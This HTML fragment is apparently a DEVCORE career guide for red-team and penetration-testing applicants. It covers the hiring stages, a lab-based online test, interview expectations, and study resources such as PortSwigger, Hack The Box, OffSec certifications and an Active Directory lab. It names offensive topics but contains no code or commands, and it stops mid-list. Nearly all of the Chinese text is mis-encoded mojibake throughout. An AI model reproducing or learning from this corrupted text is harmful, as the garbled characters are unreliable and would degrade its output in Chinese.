&lt;p&gt;é †å¸¶ä¸€æï¼Œæœ‰ä¸€å€‹åœ¨å­¸ç”Ÿå¯èƒ½æ„Ÿèˆˆè¶£çš„è³‡è¨Šï¼šDEVCORE æœ‰ç ”ç™¼æ›¿ä»£å½¹åé¡ï¼Œå”¯åé¡æœ‰é™ï¼Œæ¨è–¦æ‚¨åœ¨å­¸æœŸé–“ç›¡æ—©æŠ•éå±¥æ­·ä¸¦è©¢å•æ›¿ä»£å½¹ç‹€æ³ã€‚&lt;/p&gt;

&lt;h2 id=&quot;-devcore-æ‡‰å¾µæµç¨‹&quot;&gt;ğŸš€ DEVCORE æ‡‰å¾µæµç¨‹&lt;/h2&gt;

&lt;p&gt;æ‡‰å¾µç´…éšŠæ¼”ç·´å°ˆå®¶ã€æ»²é€æ¸¬è©¦å·¥ç¨‹å¸«éƒ½æœƒç¶“æ­·ã€Œæ›¸é¢å¯©æŸ¥ã€ã€ã€Œç·šä¸Šæ¸¬é©—ã€ã€ã€Œé¢è©¦ã€ä¸‰å€‹éšæ®µã€‚&lt;/p&gt;

&lt;h3 id=&quot;-æ›¸é¢å¯©æŸ¥&quot;&gt;ğŸ“Œ æ›¸é¢å¯©æŸ¥&lt;/h3&gt;

&lt;p&gt;å±¥æ­·æ˜¯é€™å€‹éšæ®µä¸»è¦è©•ä¼°ä¾æ“šï¼Œä»¥ä¸‹ 4 é»æ˜¯æˆ‘å€‘èªç‚ºæ‡‰å¾µè€…éœ€è¦æ³¨æ„çš„åœ°æ–¹ï¼š&lt;/p&gt;

&lt;h4 id=&quot;å±¥æ­·å…§å®¹ç¬¦åˆè·å‹™éœ€æ±‚å—&quot;&gt;å±¥æ­·å…§å®¹ç¬¦åˆè·å‹™éœ€æ±‚å—&lt;/h4&gt;

&lt;p&gt;é€™å€‹éšæ®µæœ€é‡è¦çš„æ˜¯èªªæœå¯©æ ¸è€…ä½ å…·å‚™è·å‹™éœ€æ±‚çš„èƒ½åŠ›ï¼Œæ‰€ä»¥è«‹ç›¡é‡åœ¨å±¥æ­·å…§å®¹é™„ä¸Šèƒ½å¹«åŠ©åˆ¥äººåˆ¤æ–·çš„ä½è­‰è³‡è¨Šã€‚éå»æœ‰äº›æŠ€è¡“åº•ä¸éŒ¯çš„åŒå­¸åªå–®ç´”æ”¾äº†å­¸æ­·ï¼Œé€™æ¨£è¦è®“å¯©æ ¸è€…æƒ³æ‰¾å€‹å¯ä»¥é€²å…¥ä¸‹ä¸€éšæ®µçš„ç†ç”±éƒ½é›£ï¼Œç›¸ç•¶å¯æƒœã€‚&lt;/p&gt;

&lt;h4 id=&quot;ç”¨ä¸€äº›å¯¦ä¾‹èªªæ˜å§&quot;&gt;ç”¨ä¸€äº›å¯¦ä¾‹èªªæ˜å§&lt;/h4&gt;

&lt;p&gt;å¯¦ä¾‹è­‰æ˜æ˜¯è®“ä½ çš„å±¥æ­·è„«ç©è€Œå‡ºçš„é—œéµï¼Œå…·é«”çš„æ•¸å­—å’Œäº‹å¯¦å¯ä»¥å¤§å¤§å¢åŠ å±¥æ­·çš„èªªæœåŠ›ï¼Œä¾‹å¦‚èƒ½å…·é«”èªªå‡ºæ‰“éå¤šå°‘å ´æ»²é€æ¸¬è©¦ï¼Œåœ¨éç¨‹ä¸­æ‰¾äº†å¤šå°‘æ¼æ´ï¼Œæˆ–åœ¨ä»»å‹™ä¸­è§£æ±ºäº†ä»€éº¼æ¨£çš„å•é¡Œï¼Œé”åˆ°ä»€éº¼æ•ˆæœã€‚é€™äº›ä¸åƒ…èƒ½è¡¨ç¤ºæŠ€è¡“èƒ½åŠ›ï¼Œé‚„èƒ½é¡¯ç¤ºä½ çš„å½±éŸ¿åŠ›ã€‚&lt;/p&gt;

&lt;h4 id=&quot;æä¾›æœ‰å¹«åŠ©çš„é¡å¤–è³‡è¨Š&quot;&gt;æä¾›æœ‰å¹«åŠ©çš„é¡å¤–è³‡è¨Š&lt;/h4&gt;

&lt;p&gt;ç›¸é—œå°ˆæ¥­è­‰ç…§ã€åƒèˆ‡æŠ€è¡“ç¤¾ç¾¤ã€è²¢ç»é–‹æºå°ˆæ¡ˆç­‰é¡å¤–è³‡è¨Šéƒ½æœ‰åŠ©æ–¼å¯©æ ¸è€…è©•ä¼°ã€‚æœ‰äº›äººå¥½å¥‡ä¸€äº›éæŠ€è¡“ç­‰ç¶“é©—æ‡‰ä¸æ‡‰è©²æ”¾åœ¨å±¥æ­·ä¸­ï¼Œæˆ‘å€‘é è¨­æ˜¯ä¸æœƒç‰¹åˆ¥åƒè€ƒï¼Œä½†å¦‚æœä½ èªç‚ºé€™äº›ç¶“é©—å°æœªä¾†å·¥ä½œæœ‰æ­£é¢å½±éŸ¿ï¼Œå¯é™„ä¸Šè®“å¯©æ ¸è€…è©•ä¼°ã€‚&lt;/p&gt;

&lt;h4 id=&quot;ç‰¹åˆ¥å¸Œæœ›åˆ—å‡ºçš„åŠ åˆ†é …&quot;&gt;ç‰¹åˆ¥å¸Œæœ›åˆ—å‡ºçš„åŠ åˆ†é …&lt;/h4&gt;

&lt;p&gt;ä¸‹é¢åˆ—å‡ºä¸€äº›éå¿…è¦ä½†æœ‰æœƒå¾ˆä¸éŒ¯çš„åŠ åˆ†é …ç›®ï¼Œå¦‚æœæœ‰é€™æ–¹é¢çš„ç¶“æ­·å‹™å¿…è¦å¯«ä¸Šã€‚åŒæ™‚ä¹Ÿåˆ—å‡ºæ¯å€‹é …ç›®ä¸­æˆ‘å€‘çœ‹é‡çš„ç‰¹è³ªï¼Œå¦‚æœæœ‰å…¶ä»–å¯ä»¥å±•ç¾é€™äº›ç‰¹è³ªçš„ç¶“æ­·ä¹Ÿæ­¡è¿åˆ—å‡ºä¾†è®“å¯©æ ¸è€…çŸ¥é“ã€‚&lt;/p&gt;

&lt;h5 id=&quot;-å¯¦æˆ°ç¶“é©—å¦‚cvebug-bounty&quot;&gt;ğŸ“„ å¯¦æˆ°ç¶“é©—å¦‚ï¼šCVEã€bug bounty&lt;/h5&gt;

&lt;ul&gt;
  &lt;li&gt;ä»£è¡¨æ‚¨æ“æœ‰è§£æ±ºæœªçŸ¥å•é¡Œèƒ½åŠ›ã€‚&lt;/li&gt;
  &lt;li&gt;ä»£è¡¨æ‚¨èƒ½çœ‹åˆ°åˆ¥äººæ‰€æ²’æœ‰é—œæ³¨åˆ°çš„ç´°ç¯€ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;h5 id=&quot;-ctf-writeups-æˆ–æ˜¯-blog&quot;&gt;ğŸ“„ CTF Writeups æˆ–æ˜¯ Blog&lt;/h5&gt;

&lt;ul&gt;
  &lt;li&gt;å¦‚æœåœ¨ CTF æ¯”è³½æœ‰ä¸éŒ¯çš„æˆç¸¾ï¼Œé€šå¸¸æ„å‘³è‘—ä½ æ“æœ‰åœ¨çŸ­æ™‚é–“å…§åˆ†ææ­¸ç´é‡é»çš„èƒ½åŠ›ã€ä¹Ÿèƒ½å¤ å¿«é€Ÿæ‰¾åˆ°è§£æ±ºè¾¦æ³•ï¼Œè¯æƒ³åŠ›å‰µé€ åŠ›å¯èƒ½ä¹Ÿä¸å·®ã€‚&lt;/li&gt;
  &lt;li&gt;æˆ‘å€‘å¸Œæœ›èƒ½äº†è§£æ‚¨å¦‚ä½•æè¿°è¤‡é›œçš„æ¼æ´ï¼Œå› ç‚ºåœ¨å°‡ä¾†çš„å·¥ä½œä¸­éœ€è¦å°‡æ¼æ´éç¨‹æ¸…æ¥šæè¿°ä¸¦çµ¦äºˆå»ºè­°ã€‚&lt;/li&gt;
  &lt;li&gt;å¯« Blog é™¤äº†èƒ½å±•ç¾è¡¨é”å’Œæ–‡å­—èƒ½åŠ›å¤–ï¼Œé€šå¸¸ä¹Ÿå…·æœ‰æŒçºŒå­¸ç¿’çš„ç†±æƒ…å’Œæ¨‚æ–¼åˆ†äº«çš„ç‰¹è³ªï¼Œç¬¦åˆ DEVCORE æ ¸å¿ƒåƒ¹å€¼è§€ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;h5 id=&quot;-ctf-å‡ºé¡Œç¶“é©—&quot;&gt;ğŸ“„ CTF å‡ºé¡Œç¶“é©—&lt;/h5&gt;

&lt;ul&gt;
  &lt;li&gt;ä»£è¡¨å¹³å¸¸æœƒæŒçºŒé—œæ³¨æµè¡Œçš„æŠ€è¡“ã€ç ”ç©¶èªè¨€æˆ–æ¡†æ¶ç‰¹æ€§ï¼Œèƒ½æ³¨æ„åˆ°ä¸€äº›é®®å°‘äººçŸ¥é“çš„å°ç´°ç¯€ã€‚&lt;/li&gt;
  &lt;li&gt;èªªæ˜ä½ é™¤äº†æ”»æ“Šï¼Œé‚„å…·å‚™ä¸€å®šç¨‹åº¦çš„é–‹ç™¼èƒ½åŠ›ã€‚&lt;/li&gt;
  &lt;li&gt;ç‚ºäº†æ€•é¡Œç›®è¢« CTF ç©å®¶æƒ¡æ„ç ´å£ï¼Œé€šå¸¸å‡ºé¡Œè€…ä¹Ÿå…·å‚™é«˜æ°´æº–çš„é˜²ç¦¦èƒ½åŠ›ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;-ç·šä¸Šæ¸¬é©—&quot;&gt;ğŸ“Œ ç·šä¸Šæ¸¬é©—&lt;/h3&gt;

&lt;p&gt;é€™å€‹éšæ®µçš„é€²è¡Œæ–¹å¼èˆ‡ä¸€èˆ¬ç·šä¸Šé¶æ©Ÿç’°å¢ƒå¦‚ OSCPã€HTB ç„¡ç•°ï¼Œæœƒåˆ†é…åˆ°ä¸€å€‹é¡Œçµ„ï¼Œå¹³å‡éœ€è¦è§£äº”æŠŠ flagã€‚æ‡‰å¾µè€…æœƒæœ‰ç›¸ç•¶è¶³å¤ çš„æ™‚é–“é€²è¡Œè§£é¡Œï¼ˆé è¨­ 10 å¤©ï¼Œè¦–é¡Œç›®æœƒå¾®èª¿ï¼‰ï¼Œæœ€å¾Œäº¤ä»˜å ±å‘Šã€‚æˆ‘å€‘æœŸå¾…å¾ç·šä¸Šæ¸¬é©—ä¸­çœ‹åˆ°æ‡‰å¾µè€…å…·å‚™ä¸‹è¿°èƒ½åŠ›ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;åµæŸ¥ï¼šèƒ½å¦é€éç¾æœ‰è³‡è¨Šåˆç†æ¨æ–·èƒŒå¾Œçš„æ¶æ§‹æˆ–å¯«æ³•ã€‚&lt;/li&gt;
  &lt;li&gt;æ¼æ´æŒ–æ˜ï¼šèƒ½å¦æ‰¾åˆ°é¡Œç›®ä¸­è¨­è¨ˆçš„æ¼æ´ã€‚&lt;/li&gt;
  &lt;li&gt;æ‡‰è®Šï¼šç¢°åˆ°ç‰¹æ®Šçš„ç’°å¢ƒå¯å¦è‡ªè¡Œæƒ³è¾¦æ³•å…‹æœã€‚ä¾‹å¦‚åœ¨åªæœ‰ command injection ä¸”å…§ç¶²æœ‰é˜²ç«ç‰†é™åˆ¶çš„ç‰¹æ®Šç’°å¢ƒä¸‹ï¼Œæ€éº¼ç”¨æ‰‹é‚Šå¯åˆ©ç”¨çš„è³‡æºé”æˆä½ çš„ç›®æ¨™ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;-é¢è©¦&quot;&gt;ğŸ“Œ é¢è©¦&lt;/h3&gt;

&lt;p&gt;æœ€å¾Œçš„é¢è©¦éšæ®µæœƒå…¨é¢è©•ä¼°ä½ æ˜¯å¦é©åˆé€™å€‹è·ä½ï¼Œä¸‹è¿° 2 ä»¶äº‹æƒ…ç‰¹åˆ¥æƒ³èˆ‡æ‡‰å¾µè€…åˆ†äº«ï¼š&lt;/p&gt;

&lt;h4 id=&quot;è¢«å•å€’æ˜¯æ­£å¸¸çš„&quot;&gt;è¢«å•å€’æ˜¯æ­£å¸¸çš„&lt;/h4&gt;

&lt;p&gt;åœ¨é¢è©¦éç¨‹ä¸­ï¼Œé¢è©¦å®˜æœƒå¾å¤šå€‹è§’åº¦æ·±å…¥äº†è§£æ‡‰å¾µè€…æŠ€è¡“çš„å»£åº¦å’Œæ·±åº¦ï¼Œå› æ­¤ï¼Œæœƒè¢«å•å€’æ˜¯æ­£å¸¸çš„ã€‚è«‹å°è‡ªå·±çš„æŠ€è¡“èƒ½åŠ›æœ‰ä¿¡å¿ƒï¼Œç•¢ç«Ÿä½ å·²ç¶“é€šéäº†ç¬¬äºŒéšæ®µçš„ç·šä¸Šæ¸¬é©—ã€‚è¢«å•åˆ°ä¸ç†Ÿæ‚‰çš„å•é¡Œæ™‚ï¼Œåªè¦èª å¯¦åœ°è¡¨é”ä½ çš„æ€è€ƒéç¨‹å’Œè§£æ±ºå•é¡Œçš„æ–¹æ³•å³å¯ã€‚æˆ‘å€‘æƒ³è¦çŸ¥é“æ€è€ƒè„ˆçµ¡ï¼Œç”šè‡³æœŸå¾…ä½ èªªï¼šæˆ‘çœ‹åˆ° XX ç‰¹å¾µè¦ºå¾—é€™é¡Œå¯èƒ½æ˜¯ OO æ–¹å‘è§£ï¼Œæˆ‘æœƒæƒ³ç”¨ä»€éº¼é—œéµå­—æœå°‹æ‰¾ç­”æ¡ˆã€‚é€™æ¨£çš„å›ç­”ä¹Ÿå‡¸é¡¯äº†ä½ çš„åˆ¤æ–·åŠ›å’Œè§£æ±ºå•é¡Œçš„èƒ½åŠ›ã€‚&lt;/p&gt;

&lt;h4 id=&quot;åˆ†äº«ä½ çš„-hack-æ•…äº‹&quot;&gt;åˆ†äº«ä½ çš„ Hack æ•…äº‹&lt;/h4&gt;

&lt;p&gt;æˆ‘å€‘æœŸå¾…åœ¨é¢è©¦ä¸­è½ä½ åˆ†äº«éå»ç‰¹åˆ¥çš„ Hack ç¶“æ­·ï¼Œä¸¦ä¸”èˆ‡ä½ è¨è«–ç´°ç¯€ã€‚Hack çš„å…§å®¹ä¸é™ï¼Œä¾‹å¦‚ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;å±¥æ­·ä¸­æåˆ°çš„ CVEã€bug bounty
    &lt;ul&gt;
      &lt;li&gt;å¸Œæœ›æ˜¯ä¸€äº›ç‰¹åˆ¥çš„æƒ…å¢ƒï¼Œå¦‚æœæ‰¾åˆ°çš„æ˜¯å¸¸è¦‹æ¼æ´å¦‚ SQLi æˆ– XSSï¼Œé‚£æœƒå¸Œæœ›äº†è§£é€™å€‹æ¼æ´ç‰¹åˆ¥åœ¨å“ªï¼Ÿæˆ–è€…æ˜¯èƒ½èªªå‡ºä½ åšäº†ä»€éº¼ï¼Œç‚ºä»€éº¼ä½ èƒ½æ‰¾åˆ°é€™å€‹æ¼æ´ï¼Ÿ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;åœ¨ CTF æ¯”è³½ä¸­æƒ³åˆ°çš„ç²¾å¦™è§£æ³•&lt;/li&gt;
  &lt;li&gt;ç”Ÿæ´»ä¸­ç‚ºäº†é”æˆç›®æ¨™åšçš„ Hack
    &lt;ul&gt;
      &lt;li&gt;ä¾‹å¦‚ï¼šç‚ºäº†è‡ªå‹•åŒ–å·¥ä½œæµç¨‹å¯«äº†å€‹å°å·¥å…·ï¼›ç‚ºäº†ç§Ÿæˆ¿è³‡è¨Šä¸²äº†å€‹æ–¹ä¾¿é€šçŸ¥ç³»çµ±ï¼›æƒ³æŠŠéŠæˆ²æ¯æ—¥é ˜å–ä»»å‹™è‡ªå‹•åŒ–ã€‚&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;-è‡ªæˆ‘é›éŠä¹‹è·¯&quot;&gt;ğŸš€ è‡ªæˆ‘é›éŠä¹‹è·¯&lt;/h2&gt;

&lt;p&gt;é€™ä¸€æ®µå¯«çµ¦ç¾åœ¨é‚„åœ¨æº–å‚™éšæ®µï¼Œæœªä¾†å¾ˆæƒ³è¦åŠ å…¥è³‡å®‰æª¢æ¸¬è¡Œæ¥­çš„åŒå­¸ã€‚ç‚ºäº†å¢åŠ è‡ªå·±çš„å¯¦åŠ›ï¼Œåœ¨æ‡‰å¾µå‰æœ‰ä¸‹é¢å¹¾å€‹ç²¾é€²äº‹é …å¯åƒè€ƒï¼Œé€™å°åœ¨è³‡å®‰é ˜åŸŸé•·é ç™¼å±•ä¹Ÿå¾ˆæœ‰å¹«åŠ©ã€‚&lt;/p&gt;

&lt;h3 id=&quot;-è£œè¶³åŸºç¤çŸ¥è­˜&quot;&gt;ğŸ“Œ è£œè¶³åŸºç¤çŸ¥è­˜&lt;/h3&gt;

&lt;h4 id=&quot;web-å¸¸è¦‹æ¼æ´ç¨®é¡&quot;&gt;Web å¸¸è¦‹æ¼æ´ç¨®é¡&lt;/h4&gt;

&lt;p&gt;æˆ‘å€‘èªç‚º &lt;a href=&quot;https://portswigger.net/web-security&quot;&gt;PortSwigger Web Security Academy&lt;/a&gt; æ•´ç†çš„æ¼æ´ç¶“å…¸ä¸”å®Œæ•´ï¼ŒåŠ ä¸Šæœ‰ LAB å¯ä»¥ç›´æ¥ç·´ç¿’ï¼Œé©åˆåˆå­¸è€…ã€‚é€™äº›æ¼æ´æ˜¯å¾äº‹è³‡å®‰æª¢æ¸¬æœ€åŸºç¤çš„æºé€šèªè¨€ï¼Œæ¨è–¦è¦æŠŠ&lt;a href=&quot;https://portswigger.net/web-security/all-materials&quot;&gt;æ•™æé é¢&lt;/a&gt;ä¸Šæ‰€æœ‰æ¼æ´ç·´ç¿’å®Œï¼Œå¯ä»¥å¾&lt;a href=&quot;https://portswigger.net/web-security/all-topics&quot;&gt;ä¸»é¡Œé é¢&lt;/a&gt;çœ‹åˆ†é¡æœƒæ¯”è¼ƒæ¸…æ¥šã€‚è‹¥ä»¥ç´…éšŠç‚ºç›®æ¨™ï¼Œæˆ‘å€‘æœƒå„ªå…ˆé—œæ³¨èƒ½æ‹¿ shell çš„å¾Œç«¯æ¼æ´ã€‚
ä»¥ä¸‹æä¾›å¹¾é»è‡ªæˆ‘é©—è­‰èˆ‡ç²¾é€²é …ç›®ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;æŠ½ä¸€å€‹æ¼æ´æ˜¯å¦å¯ä»¥èªªå‡ºé€™å€‹æ¼æ´å¸¸ç™¼ç”Ÿåœ¨ä»€éº¼åŠŸèƒ½ï¼ŸèƒŒå¾Œçš„æˆå› ï¼Ÿé€šå¸¸å¯ä»¥æ€éº¼é€²éšåˆ©ç”¨é€™å€‹æ¼æ´ï¼Ÿ&lt;/li&gt;
  &lt;li&gt;æœ‰æ²’æœ‰è¾¦æ³•åœ¨é»‘ç®±ç‹€æ…‹ï¼Œé€éæ¸¬è©¦è¾¨è­˜å‡ºé€™äº›æ¼æ´ï¼Ÿ&lt;/li&gt;
  &lt;li&gt;åœ¨ç™½ç®±ç‹€æ…‹ä¸‹ï¼ŒçŸ¥é“å“ªäº›æ¼æ´è¦é€éæœå°‹ä»€éº¼å‡½æ•¸æ‰¾åˆ°ï¼Ÿ&lt;/li&gt;
  &lt;li&gt;æˆ‘å€‘åœ¨é¢è©¦ä¸­å–œæ­¡å•å„ç¨®æ¼æ´æ€éº¼æ‹¿ shell çš„å•é¡Œï¼Œå› ç‚ºé€™å°±æ˜¯ç´…éšŠæ¼”ç·´ç›®æ¨™çš„ç¬¬ä¸€æ­¥ã€‚æœå°‹ â€œfrom XSS to RCEâ€ é€™é¡çš„é—œéµå­—èƒ½æ‰¾åˆ°ç›¸ç•¶å¤šæ¡ˆä¾‹ï¼ˆXSS å¯ä»¥å–ä»£æˆ SQLi ç­‰æ¼æ´ï¼‰ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;ç´…éšŠæˆ°è¡“èˆ‡æŠ€å·§&quot;&gt;ç´…éšŠæˆ°è¡“èˆ‡æŠ€å·§&lt;/h4&gt;

&lt;p&gt;æ§åˆ¶ä¸€å°é›»è…¦å¾Œï¼Œä»éœ€è¦åœ¨å…§ç¶²ä¸­æ“´æ•£å®Œæˆä»»å‹™ç›®æ¨™ã€‚&lt;a href=&quot;https://ired.team/&quot;&gt;ired.team&lt;/a&gt; æä¾›äº†ä¸€æœ¬ç´…éšŠæŠ€å·§å·¥å…·æ›¸ï¼Œæ¨è–¦é–±è®€ä»¥äº†è§£åœ¨ä¸åŒéšæ®µæœ‰å“ªäº›æ‹›å¼å¯ç”¨ã€‚å° DEVCORE è€Œè¨€ï¼Œæˆ‘å€‘å„ªå…ˆé—œæ³¨ã€ŒActive Directory &amp;amp; Kerberos Abuseã€ã€ã€ŒCredential Access &amp;amp; Dumpingã€ã€ã€ŒLateral Movementã€ç« ç¯€ä¸‹çš„æŠ€èƒ½ã€‚æ­¤å¤–ï¼Œã€ŒNetwork pivoting &amp;amp; tunnelingã€çš„æ¦‚å¿µå’ŒæŠ€å·§ä¹Ÿæ˜¯æˆ‘å€‘æœƒé—œæ³¨çš„èƒ½åŠ›ï¼Œired.team åœ¨é€™å¡Šè‘—å¢¨è¼ƒå°‘ï¼Œ&lt;a href=&quot;https://blog.raw.pm/en/state-of-the-art-of-network-pivoting-in-2019/&quot;&gt;é€™ç¯‡æ–‡ç« &lt;/a&gt;æ¶µè“‹äº†å¿…è¦çŸ¥è­˜å’Œå·¥å…·å¯åƒè€ƒã€‚
ä»¥çµ‚ç‚ºå§‹å­¸ç¿’ï¼Œå¸Œæœ›åœ¨ç·´ç¿’é€™äº›æŠ€å·§å’Œå·¥å…·å¾Œï¼Œèƒ½å°ä¸‹é¢çš„å•é¡Œæœ‰è‡ªå·±çš„çœ‹æ³•ï¼š&lt;/p&gt;

&lt;p&gt;å¦‚æœæ‰“ä¸‹ä¼æ¥­ä¸€å°å¤–ç¶²æœå‹™ï¼Œè€Œä½ çš„ç›®æ¨™æ˜¯è©²ä¼æ¥­å…§ç¶²ç¶²åŸŸæ§åˆ¶å™¨ï¼ˆæƒ…å¢ƒæ¶æ§‹å¯è‡ªè¡Œå‡è¨­ï¼‰ï¼š&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;ç‚ºäº†æ‰“ ADï¼Œä½ åœ¨æ‰“ä¸‹çš„å¤–ç¶²ä¼ºæœå™¨ä¸Šæœƒåšå“ªäº›äº‹æƒ…ï¼Ÿç‚ºä»€éº¼ï¼Ÿéç¨‹ä¸­ä½ åå¥½ä½¿ç”¨ä»€éº¼å·¥å…·ï¼Ÿåå¥½çš„åŸå› æ˜¯ä»€éº¼ï¼Ÿ&lt;/li&gt;
  &lt;li&gt;åŒä¸Šï¼Œé€™å°ä¼ºæœå™¨å¦‚æœæœ‰ç¶²åŸŸå¸³è™Ÿä½ ä¹‹å¾Œæœƒåšå“ªäº›äº‹æƒ…ï¼Ÿå¦‚æœæ²’æœ‰ç¶²åŸŸå¸³è™Ÿå‘¢ï¼Ÿ&lt;/li&gt;
  &lt;li&gt;æƒ³æ‹¿ä¸‹ç¶²åŸŸæ§åˆ¶å™¨ï¼Œå¿ƒä¸­èƒ½å¦é¦¬ä¸Šè·³å‡ºäº”ç¨®ä»¥ä¸Šçš„æ–¹æ³•ï¼Ÿä½ æœƒå„ªå…ˆå˜—è©¦ä»€éº¼æ–¹æ³•ï¼Ÿç‚ºä»€éº¼ï¼Ÿ&lt;/li&gt;
  &lt;li&gt;éç¨‹ä¸­æ©«å‘ç§»å‹•åå¥½ä½¿ç”¨ä»€éº¼å·¥å…·ï¼Ÿç‚ºä»€éº¼ï¼Ÿ&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;-ç·´ç¿’&quot;&gt;ğŸ“Œ ç·´ç¿’&lt;/h3&gt;

&lt;h4 id=&quot;è™›æ“¬é¶æ©Ÿç·´ç¿’&quot;&gt;è™›æ“¬é¶æ©Ÿç·´ç¿’&lt;/h4&gt;

&lt;p&gt;é™¤äº†çŸ¥è­˜å¤–ï¼Œä¹Ÿè¦æ‰¾ä¸€äº›æ¨¡æ“¬ç’°å¢ƒåŸ¹é¤Šæ‰‹æ„Ÿã€‚çŸ¥åçš„ Hack The Box å’Œ OffSec éƒ½æœ‰æ¨å‡ºå­¸ç¿’è·¯å¾‘å’Œè±å¯Œçš„é¶æ©Ÿï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://academy.hackthebox.com/catalogue/paths&quot;&gt;Hack The Box Cybersecurity Paths&lt;/a&gt; (å„ªå…ˆç·´ç¿’ï¼šPenetration Tester, Senior Web Penetration Tester, Active Directory Enumeration)&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.offsec.com/learning/paths/&quot;&gt;OffSec Learning Paths&lt;/a&gt; (Filter: Red Teamer, Web App Tester)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;é¸æ“‡é©åˆè‡ªå·±çš„å¹³å°ç·´ç¿’å³å¯ã€‚ä¹Ÿå¯ä»¥å–®ç´”æ‰“ &lt;a href=&quot;https://app.hackthebox.com/&quot;&gt;HTB Labs&lt;/a&gt; é¶æ©Ÿï¼Œç·´åˆ°è¦ºå¾—æ¯æ¬¡è§£é¡Œç›®è¦åšçš„äº‹æƒ…éƒ½é¡ä¼¼ï¼Œé–‹å§‹è¦ºå¾—é¡Œç›®æœ‰å¥—è·¯æ„Ÿå°±å¯ä»¥äº†ï¼Œä¸€äº›ç‰¹æ®Šè§£æ³•åœ¨ç¾éšæ®µä¸éœ€ç³¾çµã€‚éå»æœ‰ç© HTB çš„å¯¦ç¿’ç”Ÿåœ¨éŒ„å–å‰é™„ä¸Šçš„ Writeups å¤§æ¦‚æœƒå¯« 30~50 å°é¶æ©Ÿï¼Œé€™å€‹æ•¸é‡ç´šæˆ–è¨±å¯ä»¥åƒè€ƒã€‚å¦å¤–è‹¥è¦ç·´ç¿’æ‰“ç¶²åŸŸï¼Œæœ€è¿‘ GitHub ä¸Šæœ‰ä¸€å€‹ &lt;a href=&quot;https://github.com/Orange-Cyberdefense/GOAD&quot;&gt;GOAD LAB&lt;/a&gt; å°ˆæ¡ˆæ»¿å€¼å¾—åƒè€ƒã€‚&lt;/p&gt;

&lt;p&gt;å¦‚æœæƒ³è€ƒè­‰ç…§ï¼Œæˆ‘å€‘æœ‰è€ƒéè¦ºå¾—å°ææ˜‡æª¢æ¸¬å·¥ä½œèƒ½åŠ›æœ‰å¹«åŠ©çš„æœ‰ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.offsec.com/courses/pen-200/&quot;&gt;OffSec PEN-200(OSCP) &lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;ææ˜‡è­˜åˆ¥å’Œåˆ©ç”¨æ¼æ´èƒ½åŠ›&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.offsec.com/courses/web-300/&quot;&gt;OffSec WEB-300(OSWE)&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;ææ˜‡ç™½ç®±æŒ–æ˜æ¼æ´èƒ½åŠ›&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.alteredsecurity.com/adlab&quot;&gt;Certified Red Team Professional (CRTP) &lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;ææ˜‡ç¶²åŸŸç›¸é—œåŸºæœ¬çŸ¥è­˜é¢èˆ‡æ”»æ“Šé¢&lt;/li&gt;
      &lt;li&gt;æ–°æ‰‹å‹å–„ï¼Œæ˜¯å°‘æ•¸å¯ä»¥ç³»çµ±æ€§å­¸ç¿’ç¶²åŸŸæ”»æ“Šçš„å ´åŸŸã€‚å…§å®¹è¼ƒç°¡å–®ä¸”èˆ‡ DEVCORE æ…£ç”¨ä½œæ³•æœ‰è½å·®ï¼Œä½†å…¥è·å¾Œä¸Šæ‰‹æœƒè¼ƒå¿«ã€‚&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;è¨»ï¼šä»¥ä¸Šåƒ…æä¾›å·²çŸ¥æœ‰å¹«åŠ©çš„è­‰ç…§ï¼Œä¸ä»£è¡¨å…¶ä»–è­‰ç…§æ²’æœ‰å¹«åŠ©&lt;/p&gt;

&lt;h4 id=&quot;å¯¦æˆ°ç·´ç¿’&quot;&gt;å¯¦æˆ°ç·´ç¿’&lt;/h4&gt;

&lt;p&gt;æœ€æ¨è–¦çš„é‚„æ˜¯åˆ°çœŸå¯¦å ´åŸŸä¾†çœ‹çœ‹ã€‚&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;ç™½ç®±ç·´ç¿’&lt;/strong&gt;ï¼šå¯ä»¥å˜—è©¦æ‰¾ä½ ç†Ÿæ‚‰æˆ–å–œæ­¡çš„ GitHub å°ˆæ¡ˆï¼Œå…ˆçœ‹é€™å€‹å°ˆæ¡ˆéå»çš„æ¼æ´ï¼Œè©¦è©¦çœ‹å¦‚æœè‡ªå·±ç™½ç®±çœ‹æœ‰æ²’æœ‰è¾¦æ³•èƒ½è¿½åˆ°ã€‚å¦‚æœé€™äº›æœ‰æ­£è§£çš„æ¼æ´éƒ½èƒ½é †åˆ©æ‰¾åˆ°ï¼Œæ¥è‘—å°±é–‹å§‹æ‰¾ä¸€äº› Open Source å°ˆæ¡ˆä¾†æŒ–æ˜ 0-day å§ã€‚&lt;/li&gt;
